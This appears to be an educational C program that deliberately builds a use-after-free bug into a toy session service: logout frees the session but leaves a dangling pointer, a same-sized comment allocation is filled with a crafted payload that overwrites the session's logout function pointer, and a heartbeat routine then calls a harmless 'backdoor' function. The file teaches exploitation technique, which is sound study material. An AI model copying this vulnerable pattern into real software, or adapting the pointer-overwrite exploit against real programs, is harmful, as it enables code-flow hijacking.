/*

Project Description: Use-After-Free (UAF) in an Isolated Environment

-----

vulnserver.c is a deliberately vulnerable session management service, used to demonstrate  
a UAF bug that leads to the manipulation of the code flow.

Reference: https://cwe.mitre.org/data/definitions/416.html

Code Structure:

'Session' struct - Consists of a character array 'username' and function pointer 'on_logout'.  
Common struct base, but the pointer can lead to UAF vulnerabilities that target malicious functions.

Global Variable 'current_session' - A pointer to the currently logged-on session.

Function 'normal_goodbye' - A safe function that is what is usually called by dereffing 'on_logout'

Function 'backdoor' - A portion of malicious code the UAF bug targets, called when a crafted 'Session'
has it's 'on_logout' pointer set to itself.

Function 'login' - The routine call for creating a session on a login. Sets the username to the function argument,  
and sets that Session's 'on_logout' to the 'normal_goodbye' function address.

Function 'logout' - The routine call for ending a session on a logout. Runs the 'on_logout' behavior, and frees the  
'current_session' global variable.

Function 'make_comment' - An unrelated routine call for creating some arbitrary comment in some arbitrary place. However,  
the important piece is that it happens to use the same amount of memory as a 'Session'. This makes it so that a  
payload can be constructed as a comment, stealing the space that 'logout' just freed (because of a rule of using  
recently freed memory first).

Function 'session_heartbeat' - A routine call that runs periodically to check if current_session is NULL. If an  
"active" session is detected, its 'on_logout' behavior runs. This is the "use" in the "use-after-free".

Main Function - The crafted "flow" of the attack. A normal user logs in and logs out. An attacker crafts a payload. The
heartbeat function runs. The bug is exploited.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USER_SIZE 32

typedef struct Session {
    char username[USER_SIZE];
    void (*on_logout)(void);
} Session;

static Session *current_session = NULL;

void normal_goodbye(void) {
    printf("msg: See ya!\n");
}

void backdoor(void) {
    printf("err: This is the backdoor function! The attacker has access.\n");
    printf("err: In a real life scenario, an attacker could run shellcode in a UAF bug exploit.\n");
    printf("err: But in this case, the point has been made.\n");
}

void login(const char *username) {
    current_session = malloc(sizeof(Session));
    if (!current_session) { perror("malloc"); exit(1); } // if malloc fails

    memset(current_session, 0, sizeof(Session));
    strncpy(current_session->username, username, USER_SIZE-1);
    current_session->on_logout = normal_goodbye;

    // Print message confirming login, and current_session location in memory
    printf("msg: Logged in as %s at %p\n", current_session->username, (void*)current_session);
}

void logout(void) {
    if (!current_session){
        // current_session doesn't exist, can't logout
        printf("msg: No current session.\n");
        return;
    }
    // else logout
    printf("msg: Logging out user - %s\n", current_session->username);
    current_session->on_logout();
    free(current_session);
    printf("msg: Session freed.\n");
}

void make_comment(const char *content, size_t len) {
    char *comment = malloc(sizeof(Session));
    if (!comment) {perror("malloc"); exit(1); } // if malloc fails

    size_t copylength = (len < sizeof(Session)) ? len : sizeof(Session);
    memcpy(comment, content, copylength);

    printf("msg: Comment stored at %p\n", (void*)comment);
    // No free since a comment would be persistent
}

void session_heartbeat(void) {
    if (current_session) {
        printf("msg: Check for stale logins sees session at %p. Logging out\n", (void*)current_session);
        current_session->on_logout();

        // In the demo, we won't run this, but this is the intended follow up 
        // free(current_session);
        // printf("msg: Session freed.\n");
    }
    else {
        printf("msg: No stale logins exist.\n");
    }
}


int main(void) {
    printf("DEMO: Address of backdoor is at %p\n", (void*)backdoor);
    printf("DEMO: In a real life attack, the attacker would need prior knowledge of this address.\n");
    printf("DEMO: This demo works under the assumption this leak has already been made.\n\n");

    //"Start" the attack
    printf("DEMO: First, the victim logs in as usual.\n\n");
    login("Professor Yan");
    printf("\n");

    printf("DEMO: Next, the victim logs out as usual.\n");
    printf("DEMO: However, we leave a dangling pointer.\n");
    logout();
    printf("\n");

    printf("DEMO: Now, the attacker uses a crafted payload.\n");
    printf("DEMO: The comment feature exposes the freed memory that the dangling pointer points to.\n");

    char payload[sizeof(Session)];
    memset(payload, 'X', USER_SIZE);
    void (*mafia)(void) = backdoor; // this is where the leaked knowledge is necessary
    memcpy(payload + USER_SIZE, &mafia, sizeof(mafia)); // takes over 'on_logout' functionality
    make_comment(payload, sizeof(payload));
    printf("\n");

    printf("DEMO: After a bit, the heartbeat checks for a stale login.\n");
    printf("DEMO: In our case, the login is no longer valid, but the comment takes over that space.\n");
    printf("DEMO: The heartbeat sees the overwritten space, and tries to logout again.\n");
    session_heartbeat();
    printf("\n");

    printf("DEMO: Heartbeat accidentally enables the attack to ensue, concluding the attack.\n");
    return 0;
}